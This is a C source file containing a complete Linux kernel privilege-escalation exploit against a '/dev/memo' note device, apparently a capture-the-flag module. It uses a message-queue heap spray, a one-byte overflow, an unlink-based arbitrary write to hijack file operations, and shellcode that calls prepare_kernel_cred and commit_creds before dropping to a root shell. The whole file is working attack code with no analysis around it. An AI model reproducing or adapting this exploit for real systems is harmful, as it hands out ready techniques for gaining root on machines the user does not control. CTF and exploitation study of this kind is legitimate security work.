#include <stdlib.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <string.h>
#include <sys/msg.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <stdint.h>

#define CMD_NEW  0x11451401
#define CMD_EDIT 0x11451402
#define CMD_DEL  0x11451403

int dev;
int qid;

/* module structs */
typedef struct {
  char data[20];
  int id;
  int size;
} request_t;

typedef struct {
  int id;
  char data[20];
} note_t;

typedef struct notelist_t {
  note_t note;
  struct notelist_t *fd;
  struct notelist_t *bk;
} notelist_t;

note_t notes[10] = {NULL};


/* msg_req structs */
typedef struct {
    long mtype;
    char mtext[0x10000];
} msg;

msg msgbuf;

struct msg_header {
    void *ll_next;
    void *ll_prev;
    long m_type;
    size_t m_ts;
    void *next;
    void *security;
} ;

/* Backup registers */
unsigned long bak_cs,bak_rflags,bak_ss,bak_rsp,bak_rip;

void bak(){
	__asm__(
		".intel_syntax noprefix;"
        "mov bak_cs, cs;"
        "mov bak_ss, ss;"
        "mov bak_rsp, rsp;"
        "pushf;"
        "pop bak_rflags;"
        ".att_syntax;"		
	);
	printf("[+]Registers backed up\n");
}

/* Helper functions */
int open_msg(){
    qid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
}

int msgsend(int qid, void* msg, size_t size, int flag) {
    int res;

    if ((res = msgsnd(qid, msg, size, flag)) == -1) {
        perror("msgsnd");
        exit(-1);
    }
    return res;
}

int newmsg(int qid, char *data, unsigned int size){
    msgbuf.mtype = 1;
    memcpy(msgbuf.mtext, &data[0x30], size - 0x30);
    return msgsend(qid, &msgbuf, size-0x30, 0);
}

void open_dev(){
    dev = open("/dev/memo",O_RDWR);
    puts("[+]Interacting with device");
}

long new(int fd){
    request_t req;

    return ioctl(dev,CMD_NEW,&req);
}

long edit(int fd, int id, int size, char *data){
    request_t req = {
        .id = id,
        .size = size
    };
    memcpy(req.data, data, size);
    return ioctl(dev,CMD_EDIT,&req);
}

long delete(int fd, int id){
    request_t req = {
        .id = id
    };

    return ioctl(dev,CMD_DEL,&req);
}

long overflow(int fd, int id){
    request_t req = {
        .id = id,
        .size = 21    
    };

    return ioctl(dev,CMD_EDIT,&req);
}

void bin_sh(){
    printf("[+]UID: %d\n",getuid());
    system("/bin/sh");
}
unsigned long bak_rip = (unsigned long)bin_sh;

void shellcode(){
    __asm__(
        ".intel_syntax noprefix;"

        // prepare_kernel_creds(0)
        "mov rbx, [rsp-0x4a8];"
        "sub rbx, 0x7aec2;"
        "xor rdi, rdi;"
        "call rbx;"
        "mov rdi, rax;"

        // commit_creds()
        "sub rbx, 0x190;"
        "call rbx;"

        // recover registers
        "swapgs;"
        "mov r15, bak_ss;"
        "push r15;"
        "mov r15, bak_rsp;"
        "push r15;"
        "mov r15, bak_rflags;"
        "push r15;"
        "mov r15, bak_cs;"
        "push r15;"
        "mov r15, bak_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"

    );
}

/* Exploit */
int main(){
    int c;
    int out;
    request_t reqst;
    unsigned long module_addr, top_addr, file_ops_addr, bss_func_ptr;

    /* Mapped region to add a userland object to the list */
    void* fake_chunk = mmap(0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC,
                    MAP_ANON|MAP_FIXED|MAP_PRIVATE, -1, 0);

    /* Mapped region with pointers to shellcode */
    void* shellcode_ptr = mmap(0xdead000, 8, PROT_READ|PROT_WRITE|PROT_EXEC,
                    MAP_ANON|MAP_FIXED|MAP_PRIVATE, -1, 0);    

    char payload[0xf000];

    /* Copy pointer to shellcode to mapped region */
    *(unsigned long *)shellcode_ptr = shellcode;
    bss_func_ptr = 0xdead000;

    /* Craft fake note with a pointer to the mapped region */
    *(unsigned long *)(payload + 0x1010) = 0x1337000;
    *(unsigned long *)(payload + 0x1018) = 0x1337030;

    /* Backup userland registers */
    bak();

    open_dev();
    open_msg();

    /* Allocate initial notes and spray msg objects */
    notes[0].id = new(dev); //0
    printf("Note 0: 0x%x\n",notes[0].id);
    newmsg(qid, payload, 0x1032);
    notes[1].id = new(dev); //1
    printf("Note 1: 0x%x\n",notes[1].id);
    newmsg(qid, payload, 0x1032);
    notes[2].id = new(dev); //2
    printf("Note 2: 0x%x\n",notes[2].id);
    newmsg(qid, payload, 0x1032);

    /* Brute chunk with good LSB */
    while(1){
        notes[3].id = new(dev); //3
        if ((notes[3].id & 0xff) == 0xc0){
            printf("Note 3: 0x%x\n",notes[3].id);
            break;
        } else {
            delete(dev,notes[3].id);
        }
    }

    /* Overwrite LSB of notes[3].id with msg chunk */
    overflow(dev, notes[3].id);
    delete(dev, notes[3].id);
    *(unsigned int *)fake_chunk = notes[3].id;

    /* Unlink msg and leak the top node addr */
    delete(dev, 0);
    top_addr = *(unsigned long *)(fake_chunk + 32);
    module_addr = top_addr - 0x2100;
    file_ops_addr = module_addr + 0x2050;
    printf("[+]module leak: 0x%lx\n", module_addr);

    /* Arbitrary write through unlink */
    *(unsigned long *)(fake_chunk + 24) = file_ops_addr - 4;
    *(unsigned long *)(fake_chunk + 32) = top_addr;
    edit(dev, 0, 20, bss_func_ptr);

    /* Trigger shellcode */
    new(dev);

    return 0;
}